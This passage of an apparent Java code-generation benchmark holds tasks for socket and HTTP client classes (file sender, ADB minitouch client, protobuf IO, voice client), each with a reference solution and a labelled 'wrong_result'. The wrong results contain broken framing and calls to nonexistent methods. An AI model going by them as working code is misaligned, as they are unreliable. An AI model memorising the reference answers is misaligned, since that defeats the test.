    "Canonical_solution": "import android.content.Context;\nimport java.io.BufferedOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class FileSender extends BaseTransfer implements Runnable {\n\n    private String mServerIpAddress;\n    private int mPort;\n    private FileInfo mFileInfo;\n    private Socket mSocket;\n    private OutputStream mOutputStream;\n    private OnSendListener mOnSendListener;\n\n    public FileSender(Context context, FileInfo mFileInfo, String mServerIpAddress, int mPort) {\n        this.mFileInfo = mFileInfo;\n        this.mServerIpAddress = mServerIpAddress;\n        this.mPort = mPort;\n    }\n\n    public void setOnSendListener(OnSendListener mOnSendListener) {\n        this.mOnSendListener = mOnSendListener;\n    }\n\n    @Override\n    public void run() {\n        try {\n            if(mOnSendListener != null) mOnSendListener.onStart();\n            init();\n            parseHeader();\n            parseBody();\n            finish();\n            if(mOnSendListener != null) mOnSendListener.onSuccess(mFileInfo);\n        } catch (Exception e) {\n            if(mOnSendListener != null) mOnSendListener.onFailure(e, mFileInfo);\n        }\n    }\n\n    @Override\n    public void init() throws Exception {\n        this.mSocket = new Socket(mServerIpAddress, mPort);\n        OutputStream os = this.mSocket.getOutputStream();\n        mOutputStream = new BufferedOutputStream(os);\n    }\n\n    @Override\n    public void parseHeader() throws Exception {\n        StringBuilder headerSb = new StringBuilder();\n        String jsonStr = FileInfo.toJsonStr(mFileInfo);\n        jsonStr = TYPE_FILE + SPERATOR + jsonStr;\n        headerSb.append(jsonStr);\n        int leftLen = BYTE_SIZE_HEADER - jsonStr.getBytes(UTF_8).length;\n        for(int i=0; i < leftLen; i++){\n            headerSb.append(\" \");\n        }\n        byte[] headbytes = headerSb.toString().getBytes(UTF_8);\n        mOutputStream.write(headbytes);\n    }\n\n    @Override\n    public void parseBody() throws Exception {\n        InputStream fis = new FileInputStream(new File(mFileInfo.getFilePath()));\n        byte[] bytes = new byte[BYTE_SIZE_DATA];\n        int len = 0;\n        while((len=fis.read(bytes)) != -1){\n            mOutputStream.write(bytes, 0, len);\n            if(mOnSendListener != null) mOnSendListener.onProgress(fis.available(), mFileInfo.getSize());\n        }\n        mOutputStream.flush();\n        mOutputStream.close();\n    }\n\n    @Override\n    public void finish() {\n        try {\n            if(mOutputStream != null) mOutputStream.close();\n            if(mSocket != null && mSocket.isConnected()) mSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public interface OnSendListener {\n        void onStart();\n        void onProgress(long progress, long total);\n        void onSuccess(FileInfo fileInfo);\n        void onFailure(Throwable t, FileInfo fileInfo);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class FileSender implements Runnable {\n    private String mServerIpAddress;\n    private int mPort;\n    private FileInfo mFileInfo;\n    private Socket mSocket;\n    private OutputStream mOutputStream;\n    private OnSendListener mOnSendListener;\n\n    public FileSender(Context context, FileInfo fileInfo, String serverIpAddress, int port) {\n        this.mServerIpAddress = serverIpAddress;\n        this.mPort = port;\n        this.mFileInfo = fileInfo;\n    }\n\n    public void setOnSendListener(OnSendListener listener) {\n        this.mOnSendListener = listener;\n    }\n\n    @Override\n    public void run() {\n        init();\n        parseHeader();\n        parseBody();\n        finish();\n    }\n\n    private void init() {\n        try {\n            mSocket = new Socket(mServerIpAddress, mPort);\n            mOutputStream = new BufferedOutputStream(mSocket.getOutputStream());\n            if (mOnSendListener != null) {\n                mOnSendListener.onStart();\n            }\n        } catch (IOException e) {\n            if (mOnSendListener != null) {\n                mOnSendListener.onFailure(e, mFileInfo);\n            }\n        }\n    }\n\n    private void parseHeader() {\n        try {\n            String header = \"FILENAME:\" + mFileInfo.getName() + \"|SIZE:\" + mFileInfo.getSize();\n            mOutputStream.write(header.getBytes());\n            mOutputStream.flush();\n        } catch (IOException e) {\n            if (mOnSendListener != null) {\n                mOnSendListener.onFailure(e, mFileInfo);\n            }\n        }\n    }\n\n    private void parseBody() {\n        try (FileInputStream fis = new FileInputStream(mFileInfo.getPath())) {\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            long totalBytes = 0;\n            long totalSize = mFileInfo.getSize();\n            while ((bytesRead = fis.read(buffer)) != -1) {\n                mOutputStream.write(buffer, 0, bytesRead);\n                totalBytes += bytesRead;\n                if (mOnSendListener != null) {\n                    mOnSendListener.onProgress(totalBytes, totalSize);\n                }\n            }\n            if (mOnSendListener != null) {\n                mOnSendListener.onSuccess(mFileInfo);\n            }\n        } catch (IOException e) {\n            if (mOnSendListener != null) {\n                mOnSendListener.onFailure(e, mFileInfo);\n            }\n        }\n    }\n\n    private void finish() {\n        try {\n            if (mOutputStream != null) mOutputStream.close();\n            if (mSocket != null) mSocket.close();\n        } catch (IOException e) {\n            if (mOnSendListener != null) {\n                mOnSendListener.onFailure(e, mFileInfo);\n            }\n        }\n    }\n\n    public interface OnSendListener {\n        void onStart();\n        void onProgress(long sent, long total);\n        void onSuccess(FileInfo fileInfo);\n        void onFailure(Throwable throwable, FileInfo fileInfo);\n    }\n}"
  },
  {
    "Task_id": 417,
    "Instruction": "Task Description: Create a Java class that establishes a TCP client connection to interact with a minitouch service on an Android device through ADB forwarding, allowing for touch event simulation and connection management.\n\nClass Description: The Minitouch class provides functionality to connect to a minitouch service running on an Android device via ADB port forwarding. It handles socket communication for sending touch events and manages connection lifecycle events through listeners.\n\nAttributes:\n- REMOTE_PATH: [String] - The remote path on the Android device where minitouch binary is located\n- MINITOUCH_BIN: [String] - The name of the minitouch binary\n- listenerList: [List<MinitouchListener>] - List of listeners for connection events\n- device: [AdbDevice] - The Android device to connect to\n- minitouchSocket: [Socket] - The socket connection to minitouch service\n- minitouchOutputStream: [OutputStream] - Output stream for sending touch events\n- forward: [AdbForward] - ADB forward information for the connection\n\nMethods:\n- Minitouch([AdbDevice device]) -> [void] - Constructor that initializes the class with the target device\n- addEventListener([MinitouchListener listener]) -> [void] - Adds a listener for connection events\n- start() -> [void] - Starts the minitouch connection by setting up ADB forwarding and socket connection\n- kill() -> [void] - Terminates the connection and cleans up resources\n- sendEvent([String str]) -> [void] - Sends a touch event string to the minitouch service\n- createForward() -> [AdbForward] - Creates an ADB forward for the minitouch connection\n- removeForward([AdbForward forward]) -> [void] - Removes the specified ADB forward\n- startInitialThread([String host, int port]) -> [void] - Internal method to establish socket connection in a background thread\n- onStartup([boolean success]) -> [void] - Notifies listeners about connection status\n- onClose() -> [void] - Notifies listeners about connection closure and cleans up\n- generateForwardInfo() -> [AdbForward] - Generates ADB forward information for the connection",
    "Canonical_solution": "import com.android.ddmlib.IDevice;\nimport com.yeetor.adb.AdbDevice;\nimport com.yeetor.adb.AdbForward;\nimport com.yeetor.adb.AdbServer;\nimport com.yeetor.minicap.MinicapInstallException;\nimport com.yeetor.util.Constant;\nimport com.yeetor.util.Util;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class Minitouch {\n\n    private static final String REMOTE_PATH = \"/data/local/tmp\";\n    private static final String MINITOUCH_BIN = \"minitouch\";\n\n    private List<MinitouchListener> listenerList = new ArrayList<MinitouchListener>();\n    private AdbDevice device;\n    private Socket minitouchSocket;\n    private OutputStream minitouchOutputStream;\n    private AdbForward forward;\n\n    public Minitouch(AdbDevice device) {\n        this.device = device;\n    }\n\n    public void addEventListener(MinitouchListener listener) {\n        if (listener != null) {\n            this.listenerList.add(listener);\n        }\n    }\n\n    public void start() {\n        AdbForward forward = createForward();\n        String command = \"/data/local/tmp/minitouch\" + \" -n \" + forward.getLocalabstract();\n        startInitialThread(\"127.0.0.1\", forward.getPort());\n    }\n\n    public void kill() {\n        onClose();\n        if (minitouchSocket != null && minitouchSocket.isConnected()) {\n            try {\n                minitouchSocket.close();\n            } catch (IOException e) {\n            }\n            minitouchSocket = null;\n        }\n    }\n\n    public void sendEvent(String str) {\n        if (minitouchOutputStream == null) {\n            return;\n        }\n        try {\n            minitouchOutputStream.write(str.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private AdbForward createForward() {\n        forward = generateForwardInfo();\n        try {\n            device.getIDevice().createForward(forward.getPort(), forward.getLocalabstract(), IDevice.DeviceUnixSocketNamespace.ABSTRACT);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return forward;\n    }\n\n    private void removeForward(AdbForward forward) {\n        if (forward == null || !forward.isForward()) {\n            return;\n        }\n        try {\n            device.getIDevice().removeForward(forward.getPort(), forward.getLocalabstract(), IDevice.DeviceUnixSocketNamespace.ABSTRACT);\n        } catch (Exception e) {\n        }\n    }\n\n    private void startInitialThread(final String host, final int port) {\n        Thread thread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                int tryTime = 200;\n                while (true) {\n                    Socket socket = null;\n                    byte[] bytes = new byte[256];\n                    try {\n                        socket = new Socket(host, port);\n                        InputStream inputStream = socket.getInputStream();\n                        OutputStream outputStream = socket.getOutputStream();\n                        int n = inputStream.read(bytes);\n\n                        if (n == -1) {\n                            Thread.sleep(10);\n                            socket.close();\n                        } else {\n                            minitouchSocket = socket;\n                            minitouchOutputStream = outputStream;\n                            onStartup(true);\n                            break;\n                        }\n                    } catch (Exception ex) {\n                        if (socket != null) {\n                            try {\n                                socket.close();\n                            } catch (IOException e) {\n                                e.printStackTrace();\n                            }\n                        }\n                        continue;\n                    }\n                    tryTime--;\n                    if (tryTime == 0) {\n                        onStartup(false);\n                        break;\n                    }\n                }\n            }\n        });\n        thread.start();\n    }\n\n    private void onStartup(boolean success) {\n        for (MinitouchListener listener : listenerList) {\n            listener.onStartup(this, success);\n        }\n    }\n\n    private void onClose() {\n        for (MinitouchListener listener : listenerList) {\n            listener.onClose(this);\n        }\n        removeForward(forward);\n    }\n\n    private AdbForward generateForwardInfo() {\n        AdbForward[] forwards = AdbServer.server().getForwardList();\n        int maxNumber = 0;\n        if (forwards.length > 0) {\n            for (AdbForward forward : forwards) {\n                if (forward.getSerialNumber().equals(device.getIDevice().getSerialNumber())) {\n                    String l = forward.getLocalabstract();\n                    String[] s = l.split(\"_\");\n                    if (s.length == 3) {\n                        int n = Integer.parseInt(s[2]);\n                        if (n > maxNumber) maxNumber = n;\n                    }\n                }\n            }\n        }\n        maxNumber += 1;\n\n        String forwardStr = String.format(\"%s_touch_%d\", device.getIDevice().getSerialNumber(), maxNumber);\n        int freePort = Util.getFreePort();\n        return new AdbForward(device.getIDevice().getSerialNumber(), freePort, forwardStr);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "import java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.List;\n\npublic class Minitouch {\n    public static final String REMOTE_PATH = \"/data/local/tmp/\";\n    public static final String MINITOUCH_BIN = \"minitouch\";\n\n    private final List<MinitouchListener> listenerList;\n    private final AdbDevice device;\n    private Socket minitouchSocket;\n    private OutputStream minitouchOutputStream;\n    private AdbForward forward;\n\n    public Minitouch(AdbDevice device) {\n        this.device = device;\n        this.listenerList = new java.util.ArrayList<>();\n    }\n\n    public void addEventListener(MinitouchListener listener) {\n        listenerList.add(listener);\n    }\n\n    public void start() {\n        forward = createForward();\n        if (forward != null) {\n            startInitialThread(forward.getHost(), forward.getPort());\n        }\n    }\n\n    public void kill() {\n        if (minitouchSocket != null) {\n            try {\n                minitouchSocket.close();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        if (forward != null) {\n            removeForward(forward);\n        }\n    }\n\n    public void sendEvent(String str) {\n        if (minitouchOutputStream != null) {\n            try {\n                minitouchOutputStream.write(str.getBytes());\n                minitouchOutputStream.flush();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private AdbForward createForward() {\n        return generateForwardInfo();\n    }\n\n    private void removeForward(AdbForward forward) {\n        // Implementation to remove ADB forward\n    }\n\n    private void startInitialThread(String host, int port) {\n        new Thread(() -> {\n            try {\n                minitouchSocket = new Socket(host, port);\n                minitouchOutputStream = minitouchSocket.getOutputStream();\n                onStartup(true);\n            } catch (Exception e) {\n                onStartup(false);\n            }\n        }).start();\n    }\n\n    private AdbForward generateForwardInfo() {\n        // Implementation to generate ADB forward info\n        return new AdbForward(\"localhost\", 7100);\n    }\n\n    private void onStartup(boolean success) {\n        for (MinitouchListener listener : listenerList) {\n            listener.onStartup(success);\n        }\n    }\n\n    private void onClose() {\n        for (MinitouchListener listener : listenerList) {\n            listener.onClose();\n        }\n    }\n}"
  },
  {
    "Task_id": 418,
    "Instruction": "Task Description: Implement a Java class for handling Protocol Buffers (protobuf) communication over TCP sockets, including message sending, receiving, and callback management for different response types (error, warning, info, success).\n\nClass Description: ProtobufIO is a TCP client implementation that facilitates bidirectional protobuf message exchange with a server. It handles message serialization/deserialization, connection management, and provides callback mechanisms for processing server responses.\n\nAttributes:\n\nsock: [Socket] - TCP socket connection to the server\ninputStream: [InputStream] - Input stream for reading data from the server\noutputStream: [OutputStream] - Output stream for writing data to the server\nthread: [Thread] - Worker thread for handling incoming messages\nshutdown: [boolean] - Flag indicating whether the connection should be terminated\noutStream: [PrintStream] - Output stream for logging/debugging\ncallbacks: [List<MessageCallback>] - Registered callback handlers for server responses\napiCallIdGen: [AtomicLong] - Generator for unique API call IDs\nCALLBACK_LOCK: [Object] - Synchronization object for callback operations\n\nMethods:\n\nProtobufIO: [Constructor](String host, int port, PrintStream out, String threadName) -> [void] - Initializes TCP connection to specified host:port and starts worker thread\nsend: [long](String apiCall, MessageLite msg) -> [long] - Sends a protobuf message with auto-generated API call ID\nsend: [long](long apiCallIdRef, String apiCallRef, MessageLite... messages) -> [long] - Sends one or more protobuf messages with specified API call ID\nsend: [void](byte[] data) -> [void] - Sends raw byte data with length header\nregisterCallback: [void](MessageCallback callback) -> [void] - Registers a callback handler for server responses\nunregisterCallback: [void](MessageCallback callback) -> [void] - Unregisters a callback handler\ngetNextApiCallId: [long]() -> [long] - Generates and returns a new unique API call ID\nshutdown: [void]() -> [void] - Closes the connection and stops the worker thread\ncallback: [void](long apiCallId, long retCode, String message, String cause, String correction, String details, Map<String, String> objRefsMap) -> [void] - Internal method to dispatch callbacks based on response type\nProtobufIOWorker.run: [void]() -> [void] - Worker thread implementation for reading and processing incoming messages (inner class)",
    "Canonical_solution": "import com.linbit.linstor.api.ApiConsts;\nimport com.linbit.linstor.api.ApiRcUtils;\nimport com.linbit.linstor.proto.MsgHeaderOuterClass.MsgHeader;\nimport com.linbit.linstor.proto.common.ApiCallResponseOuterClass.ApiCallResponse;\n\nimport static com.linbit.linstor.api.ApiConsts.MASK_ERROR;\nimport static com.linbit.linstor.api.ApiConsts.MASK_INFO;\nimport static com.linbit.linstor.api.ApiConsts.MASK_WARN;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport java.util.concurrent.atomic.AtomicLong;\n\nimport com.google.protobuf.MessageLite;\n\npublic class ProtobufIO\n{\n    public static final Object CALLBACK_LOCK = new Object();\n\n    public interface MessageCallback\n    {\n        void error(long apiCallId, long retCode, String message, String cause, String correction,\n            String details, Map<String, String> objRefsMap);\n        void warn(long apiCallId, long retCode, String message, String cause, String correction,\n            String details, Map<String, String> objRefsMap);\n        void info(long apiCallId, long retCode, String message, String cause, String correction,\n            String details, Map<String, String> objRefsMap);\n        void success(long apiCallId, long retCode, String message, String cause, String correction,\n            String details, Map<String, String> objRefsMap);\n    }\n\n    protected Socket sock;\n    protected InputStream inputStream;\n    protected OutputStream outputStream;\n\n    protected Thread thread;\n    protected boolean shutdown;\n\n    private PrintStream outStream;\n    private List<MessageCallback> callbacks = new ArrayList<>();\n    protected AtomicLong apiCallIdGen = new AtomicLong(0);\n\n    public ProtobufIO(\n        String host,\n        int port,\n        PrintStream out,\n        String threadName\n    )\n        throws UnknownHostException, IOException\n    {\n        outStream = out;\n        sock = new Socket(host, port);\n        inputStream = sock.getInputStream();\n        outputStream = sock.getOutputStream();\n\n        shutdown = false;\n        thread = new Thread(new ProtobufIOWorker(), threadName);\n        thread.start();\n    }\n\n    public long send(String apiCall, MessageLite msg) throws IOException\n    {\n        return send(\n            getNextApiCallId(),\n            apiCall,\n            msg\n        );\n    }\n\n    public long send(long apiCallIdRef, String apiCallRef, MessageLite... messages) throws IOException\n    {\n        MsgHeader headerMsg = MsgHeader.newBuilder()\n            .setMsgType(MsgHeader.MsgType.API_CALL)\n            .setMsgContent(apiCallRef)\n            .setApiCallId(apiCallIdRef)\n            .build();\n\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        headerMsg.writeDelimitedTo(baos);\n\n        for (MessageLite msg : messages)\n        {\n            msg.writeDelimitedTo(baos);\n        }\n        byte[] protoData = baos.toByteArray();\n        baos.close();\n\n        send(protoData);\n\n        return apiCallIdRef;\n    }\n\n    public void send(byte[] data) throws IOException\n    {\n        byte[] header = new byte[16];\n        ByteBuffer byteBuffer = ByteBuffer.wrap(header);\n        byteBuffer.putInt(0, 0);\n        byteBuffer.putInt(4, data.length);\n\n        outputStream.write(header);\n        outputStream.write(data);\n    }\n\n    public void registerCallback(MessageCallback callback)\n    {\n        callbacks.add(callback);\n    }\n\n    public void unregisterCallback(MessageCallback callback)\n    {\n        callbacks.remove(callback);\n    }\n\n    public long getNextApiCallId()\n    {\n        return apiCallIdGen.incrementAndGet();\n    }\n\n    public void shutdown() throws IOException\n    {\n        shutdown = true;\n        sock.close();\n        thread.interrupt();\n    }\n\n    private class ProtobufIOWorker implements Runnable\n    {\n        @Override\n        public void run()\n        {\n            StringBuilder sb = new StringBuilder();\n            byte[] header = new byte[16];\n            int read;\n            int offset = 0;\n            int protoLen;\n            while (!shutdown)\n            {\n                try\n                {\n                    offset = 0;\n                    while (offset != header.length)\n                    {\n                        read = inputStream.read(header, offset, header.length - offset);\n                        if (read == -1)\n                        {\n                            return;\n                        }\n                        offset += read;\n                    }\n\n                    protoLen = (header[4] & 0xFF) << 24 |\n                               (header[5] & 0xFF) << 16 |\n                               (header[6] & 0xFF) << 8  |\n                               (header[7] & 0xFF);\n                    offset = 0;\n                    byte[] data = new byte[protoLen];\n\n                    while (offset != protoLen)\n                    {\n                        read = inputStream.read(data, offset, protoLen - offset);\n                        if (read == -1)\n                        {\n                            return;\n                        }\n                        offset += read;\n                    }\n\n                    ByteArrayInputStream bais = new ByteArrayInputStream(data);\n                    MsgHeader protoHeader = MsgHeader.parseDelimitedFrom(bais);\n\n                    sb.setLength(0);\n                    int responseIdx = 1;\n\n                    String apiCall = protoHeader.getMsgContent();\n                    if (bais.available() == 0)\n                    {\n                        sb.append(\"ApiCallId: \")\n                            .append(protoHeader.getApiCallId())\n                            .append(\"\\n\")\n                            .append(apiCall)\n                            .append(\"\\n\");\n                    }\n                    if (!apiCall.equals(ApiConsts.API_VERSION))\n                    {\n                        while (bais.available() > 0)\n                        {\n                            ApiCallResponse response = ApiCallResponse.parseDelimitedFrom(bais);\n                            long retCode = response.getRetCode();\n                            String message = response.getMessage();\n                            String cause = response.getCause();\n                            String correction = response.getCorrection();\n                            String details = response.getDetails();\n                            Map<String, String> objRefsMap = response.getObjRefsMap();\n\n                            callback(protoHeader.getApiCallId(), retCode, message, cause, correction,\n                                details, objRefsMap);\n                        }\n                    }\n                }\n                catch (IOException ioExc)\n                {\n                    if (!shutdown)\n                    {\n                        ioExc.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class ProtobufIO {\n    private Socket sock;\n    private InputStream inputStream;\n    private OutputStream outputStream;\n    private Thread thread;\n    private boolean shutdown;\n    private PrintStream outStream;\n    private List<MessageCallback> callbacks;\n    private AtomicLong apiCallIdGen;\n    private Object CALLBACK_LOCK;\n\n    public ProtobufIO(String host, int port, PrintStream out, String threadName) {\n        try {\n            sock = new Socket(host, port);\n            inputStream = sock.getInputStream();\n            outputStream = sock.getOutputStream();\n            outStream = out;\n            apiCallIdGen = new AtomicLong(0);\n            callbacks = new ArrayList<>();\n            thread = new Thread(new ProtobufIOWorker(threadName));\n            thread.start();\n        } catch (IOException e) {\n            outStream.println(\"Error connecting to server: \" + e.getMessage());\n        }\n    }\n\n    public long send(String apiCall, MessageLite msg) {\n        long id = getNextApiCallId();\n        try {\n            outputStream.write(msg.toByteArray());\n            outputStream.flush();\n        } catch (IOException e) {\n            outStream.println(\"Error sending message: \" + e.getMessage());\n        }\n        return id;\n    }\n\n    public long send(long apiCallIdRef, String apiCallRef, MessageLite... messages) {\n        long id = apiCallIdRef;\n        for (MessageLite msg : messages) {\n            try {\n                outputStream.write(msg.toByteArray());\n                outputStream.flush();\n            } catch (IOException e) {\n                outStream.println(\"Error sending message: \" + e.getMessage());\n            }\n        }\n        return id;\n    }\n\n    public void send(byte[] data) {\n        try {\n            int len = data.length;\n            byte[] lenBytes = new byte[4];\n            lenBytes[0] = (byte) (len >> 24);\n            lenBytes[1] = (byte) (len >> 16);\n            lenBytes[2] = (byte) (len >> 8);\n            lenBytes[3] = (byte) len;\n            outputStream.write(lenBytes);\n            outputStream.write(data);\n            outputStream.flush();\n        } catch (IOException e) {\n            outStream.println(\"Error sending raw data: \" + e.getMessage());\n        }\n    }\n\n    public void registerCallback(MessageCallback callback) {\n        synchronized (CALLBACK_LOCK) {\n            callbacks.add(callback);\n        }\n    }\n\n    public void unregisterCallback(MessageCallback callback) {\n        synchronized (CALLBACK_LOCK) {\n            callbacks.remove(callback);\n        }\n    }\n\n    public long getNextApiCallId() {\n        return apiCallIdGen.getAndIncrement();\n    }\n\n    public void shutdown() {\n        shutdown = true;\n        try {\n            if (sock != null) {\n                sock.close();\n            }\n            if (thread != null) {\n                thread.interrupt();\n            }\n        } catch (IOException e) {\n            outStream.println(\"Error shutting down: \" + e.getMessage());\n        }\n    }\n\n    private void callback(long apiCallId, long retCode, String message, String cause, String correction, String details, Map<String, String> objRefsMap) {\n        synchronized (CALLBACK_LOCK) {\n            for (MessageCallback callback : callbacks) {\n                callback.onMessageReceived(apiCallId, retCode, message, cause, correction, details, objRefsMap);\n            }\n        }\n    }\n\n    private class ProtobufIOWorker implements Runnable {\n        private String threadName;\n\n        public ProtobufIOWorker(String threadName) {\n            this.threadName = threadName;\n        }\n\n        @Override\n        public void run() {\n            while (!shutdown) {\n                try {\n                    byte[] lenHeader = new byte[4];\n                    int bytesRead = inputStream.read(lenHeader);\n                    if (bytesRead < 4) continue;\n                    int len = ((lenHeader[0] & 0xFF) << 24) |\n                              ((lenHeader[1] & 0xFF) << 16) |\n                              ((lenHeader[2] & 0xFF) << 8) |\n                              (lenHeader[3] & 0xFF);\n                    byte[] data = new byte[len];\n                    bytesRead = inputStream.read(data);\n                    if (bytesRead < len) continue;\n                    MessageLite message = MessageLite.parseFrom(data);\n                    callback(message.getId(), message.getRetCode(), message.getMessage(), message.getCause(), message.getCorrection(), message.getDetails(), message.getObjRefsMap());\n                } catch (IOException | IllegalArgumentException e) {\n                    outStream.println(\"Error reading from input: \" + e.getMessage());\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 419,
    "Instruction": "Task Description: Create a Java class that implements a TCP client for voice communication, handling both input and output streams for audio data transmission.\n\nClass Description: The VoiceClient class extends Thread to create a TCP client that connects to a voice server. It manages audio stream connections, handles data transmission, and provides methods for connection management.\n\nAttributes:\n- format: AudioFormat - The audio format configuration for the voice data\n- outputThread: VoiceOutput - Thread handling outgoing voice data\n- inputThread: VoiceInput - Thread handling incoming voice data\n- output: DataOutputStream - Output stream for sending data to server\n- input: DataInputStream - Input stream for receiving data from server\n- running: boolean - Flag indicating if the client is active\n- socket: Socket - The TCP socket connection\n- ip: String - The IP address of the server to connect to\n\nMethods:\n- VoiceClient(String ip) -> None - Constructor that initializes the client with server IP\n- run() -> None - Main thread method that establishes connection and starts I/O threads\n- disconnect() -> None - Closes all connections and stops the client\n- isRunning() -> boolean - Returns the running status of the client\n- getOutputStream() -> DataOutputStream - Returns the output stream\n- getInputStream() -> DataInputStream - Returns the input stream\n- getAudioFormat() -> AudioFormat - Returns the audio format configuration",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.ConnectException;\nimport java.net.Socket;\nimport javax.sound.sampled.AudioFormat;\n\npublic class VoiceClient extends Thread {\n\n    private final AudioFormat format = new AudioFormat(16_000F, 16, 1, true, true);\n    private VoiceOutput outputThread;\n    private VoiceInput inputThread;\n    private DataOutputStream output;\n    private DataInputStream input;\n    private boolean running;\n    private Socket socket;\n    private final String ip;\n\n    public VoiceClient(String ip) {\n        super(\"VoiceServer Client Thread \" + ip);\n        this.ip = ip;\n        setDaemon(true);\n    }\n\n    @Override\n    public void run() {\n        try {\n            socket = new Socket(ip, MekanismAdditionsConfig.additions.voicePort.get());\n            running = true;\n\n            input = new DataInputStream(new BufferedInputStream(socket.getInputStream()));\n            output = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));\n\n            (outputThread = new VoiceOutput(this)).start();\n            (inputThread = new VoiceInput(this)).start();\n        } catch (ConnectException e) {\n        } catch (Exception e) {\n        }\n    }\n\n    public void disconnect() {\n        try {\n            if (inputThread != null) {\n                inputThread.interrupt();\n                inputThread.close();\n            }\n            if (outputThread != null) {\n                outputThread.interrupt();\n                outputThread.close();\n            }\n            if (output != null) {\n                output.close();\n            }\n            if (input != null) {\n                input.close();\n            }\n            if (socket != null) {\n                socket.close();\n            }\n\n            interrupt();\n\n            running = false;\n        } catch (Exception e) {\n        }\n    }\n\n    public boolean isRunning() {\n        return running;\n    }\n\n    public DataOutputStream getOutputStream() {\n        return output;\n    }\n\n    public DataInputStream getInputStream() {\n        return input;\n    }\n\n    public AudioFormat getAudioFormat() {\n        return format;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class VoiceClient extends Thread {\n    private AudioFormat format;\n    private VoiceOutput outputThread;\n    private VoiceInput inputThread;\n    private DataOutputStream output;\n    private DataInputStream input;\n    private boolean running;\n    private Socket socket;\n    private String ip;\n\n    public VoiceClient(String ip) {\n        this.ip = ip;\n        this.format = new AudioFormat(8000, 16, 1, true, false);\n    }\n\n    public void run() {\n        try {\n            socket = new Socket(ip, 50000);\n            output = new DataOutputStream(socket.getOutputStream());\n            input = new DataInputStream(socket.getInputStream());\n            outputThread = new VoiceOutput(output, format);\n            inputThread = new VoiceInput(input, format);\n            outputThread.start();\n            inputThread.start();\n            running = true;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void disconnect() {\n        running = false;\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        outputThread.interrupt();\n        inputThread.interrupt();\n    }\n\n    public boolean isRunning() {\n        return running;\n    }\n\n    public DataOutputStream getOutputStream() {\n        return output;\n    }\n\n    public DataInputStream getInputStream() {\n        return input;\n    }\n\n    public AudioFormat getAudioFormat() {\n        return format;\n    }\n}"
  },
  {
    "Task_id": 42,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for making various types of HTTP requests and handling responses.\n\nClass Description: The HttpCommunicationClient class provides methods for performing HTTP operations (GET, POST) and handling redirects. It manages an HTTP client instance and supports custom headers and browser-like requests.\n\nAttributes:\naddress: [InetSocketAddress] - The target server address (host and port) for HTTP requests\nhttpClient: [HttpClient] - The underlying HTTP client instance used for making requests\n\nMethods:\nsetupHttpClient: [setupHttpClient(ThreadPool threadPool)] -> [void] - Initializes the HTTP client with redirect policy and thread pool\ncloseClient: [closeClient()] -> [void] - Closes the HTTP client resources\nexecuteAndDefaultAssertions: [executeAndDefaultAssertions(HttpRequest request)] -> [HttpResponse<String>] - Internal method to execute requests and handle responses\nget: [get(String path, String[]... headers)] -> [HttpResponse<String>] - Performs a GET request to specified path with optional headers\nbrowserGet: [browserGet(String uri)] -> [HttpResponse<String>] - Performs a GET request with browser-like User-Agent header\npost: [post(String path)] -> [HttpResponse<String>] - Performs a POST request to specified path\ngetAllRedirectLocations: [getAllRedirectLocations(String path, String[]... headers)] -> [List<String>] - Retrieves all redirect locations for a request\nbrowserHeader: [static browserHeader()] -> [String[]] - Returns browser-like User-Agent header (static utility method)",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpClient.Redirect;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpRequest.BodyPublishers;\nimport java.net.http.HttpRequest.Builder;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpResponse.BodyHandlers;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class HttpCommunicationClient {\n\n    protected InetSocketAddress address;\n    protected HttpClient httpClient;\n\n    public void setupHttpClient(ThreadPool threadPool) {\n        httpClient = HttpClient.newBuilder()\n            .followRedirects(Redirect.NORMAL)\n            .executor(threadPool.generic())\n            .build();\n    }\n\n    public void closeClient() {\n        httpClient.close();\n    }\n\n    private HttpResponse<String> executeAndDefaultAssertions(HttpRequest request) throws Exception {\n        var resp = httpClient.send(request, BodyHandlers.ofString());\n        return resp;\n    }\n\n    public HttpResponse<String> get(String path, String[] ... headers) throws Exception {\n        URI uri = URI.create(String.format(\"http://%s:%s%s\", address.getHostName(), address.getPort(), path));\n        Builder 